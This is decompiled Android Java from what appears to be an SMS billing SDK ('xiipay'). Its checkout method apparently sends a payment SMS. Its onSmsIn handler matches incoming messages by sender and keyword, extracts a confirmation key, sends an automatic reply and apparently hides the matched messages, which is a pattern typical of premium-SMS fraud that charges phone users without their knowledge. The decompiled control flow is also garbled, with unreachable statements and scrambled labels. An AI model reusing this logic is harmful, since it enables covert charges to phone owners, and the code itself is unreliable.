package com.xiipay.a;

import android.app.Activity;
import com.xiipay.Bill;

public final class b
  implements Bill
{
  private String a;
  private String b;
  private String c;
  private String d;
  private String e;
  private String f;
  private String g;
  private String h;
  private String i;
  private String j;
  private String k;
  private String l;
  private String m;
  private String n;
  private String o;
  private String p;
  private long q;
  private String r = "";
  private Activity s;
  private boolean t = false;
  
  public b() {}
  
  public final void checkout()
  {
    long l1 = System.currentTimeMillis();
    if (!k.a(this.f, this.g, this.s)) {}
    for (;;)
    {
      return;
      if ((this.n.length() == 0) || (this.m.length() == 0))
      {
        this.t = true;
        this.r = "PAY.SUCCESSED";
        return;
      }
      try
      {
        label55:
        Thread.sleep(1000L);
        if (System.currentTimeMillis() - l1 > this.q) {}
        for (this.r = "PAY.TIMEOUT"; "PAY.SUCCESSED".equals(this.r); this.r = "PAY.SUCCESSED")
        {
          try
          {
            c.a(this.s, this.e);
            return;
          }
          catch (Exception localException)
          {
            return;
          }
          if (!this.t) {
            break label55;
          }
        }
      }
      catch (InterruptedException localInterruptedException)
      {
        for (;;)
        {
          localInterruptedException.printStackTrace();
        }
      }
    }
  }
  
  public final String getAmount()
  {
    return this.b;
  }
  
  public final String getContact()
  {
    return this.c;
  }
  
  public final String getInfo()
  {
    return this.d;
  }
  
  public final String getName()
  {
    return this.a;
  }
  
  public final String getParams0()
  {
    return this.e;
  }
  
  public final String getStatus()
  {
    return this.r;
  }
  
  public final Integer getType()
  {
    return Integer.valueOf(1);
  }
  
  public final boolean onSmsIn(String paramString1, String paramString2)
  {
    Object localObject;
    int i2;
    if ((this.l != null) && (this.l.length() > 0) && (this.j != null) && (this.j.length() > 0) && (this.k != null) && (this.k.length() > 0) && (paramString1.startsWith(this.l)))
    {
      localObject = k.a(this.k, ",");
      i2 = localObject.length;
      i1 = 0;
      if (i1 >= i2)
      {
        i1 = 0;
        label88:
        if (i1 == 0) {
          break label383;
        }
        if ((this.h == null) || (this.i == null) || (this.h.length() <= 0) || (this.i.length() <= 0)) {
          break label535;
        }
        if ("^^".equals(this.h)) {
          break label540;
        }
        i2 = paramString2.indexOf(this.h);
        i1 = i2;
        if (i2 == -1) {}
      }
    }
    label383:
    label527:
    label535:
    label540:
    for (int i1 = i2 + this.h.length();; i1 = 0)
    {
      i2 = paramString2.length();
      if (i1 != -1)
      {
        if (!"$$".equals(this.i)) {
          i2 = paramString2.indexOf(this.i, i1);
        }
        if (i2 == -1) {}
      }
      for (paramString2 = paramString2.substring(i1, i2);; paramString2 = null)
      {
        localObject = this.j;
        i1 = ((String)localObject).indexOf("[Key]");
        if ((paramString2 != null) && (i1 != -1)) {}
        for (paramString2 = ((String)localObject).substring(0, i1) + paramString2 + ((String)localObject).substring("[Key]".length() + i1);; paramString2 = (String)localObject)
        {
          String str = this.l;
          i1 = str.indexOf("[Sender]");
          localObject = str;
          if (i1 != -1) {
            localObject = str.substring(0, i1) + paramString1 + str.substring("[Sender]".length() + i1);
          }
          if (!k.a((String)localObject, paramString2, this.s)) {}
          for (;;)
          {
            return false;
            if (paramString2.contains(localObject[i1]))
            {
              i1 = 1;
              break label88;
            }
            i1 += 1;
            break;
            return true;
            if (paramString1.startsWith(this.m))
            {
              localObject = k.a(this.n, ",");
              i2 = localObject.length;
              i1 = 0;
              if (i1 < i2) {}
            }
            else
            {
              if ((this.o == null) || (this.p == null) || (this.o.length() <= 0) || (this.p.length() <= 0) || (!paramString1.startsWith(this.o))) {
                continue;
              }
              paramString1 = k.a(this.p, ",");
              i2 = paramString1.length;
              i1 = 0;
            }
            for (;;)
            {
              if (i1 >= i2) {
                break label527;
              }
              if (paramString2.contains(paramString1[i1]))
              {
                return true;
                if (paramString2.contains(localObject[i1]))
                {
                  this.t = true;
                  return true;
                }
                i1 += 1;
                break;
              }
              i1 += 1;
            }
          }
        }
      }
    }
  }
  
  public final void setActivity(Activity paramActivity)
  {
    this.s = paramActivity;
  }
  
  public final void setParams0(String paramString)
  {
    this.e = paramString;
    paramString = k.a(paramString, "[+!+]");
    if (paramString.length < 6) {
      throw new RuntimeException("参数不足");
    }
    this.a = paramString[0];
    this.b = paramString[1];
    this.c = paramString[2];
    this.d = paramString[3];
  }
  
  public final void setParams1(String paramString) {}
  
  public final void setParams2(String paramString)
  {
    paramString = k.a(paramString, "[+!+]");
    if (paramString.length < 5) {
      throw new RuntimeException("参数不足");
    }
    this.q = (Long.valueOf(paramString[0]).longValue() * 1000L);
    this.f = paramString[1];
    this.g = paramString[2];
    this.m = paramString[3];
    this.n = paramString[4];
    if (paramString.length < 7) {}
    do
    {
      return;
      this.o = paramString[5];
      this.p = paramString[6];
    } while (paramString.length < 12);
    this.h = paramString[7];
    this.i = paramString[8];
    this.j = paramString[9];
    this.l = paramString[10];
    this.k = paramString[11];
  }
}
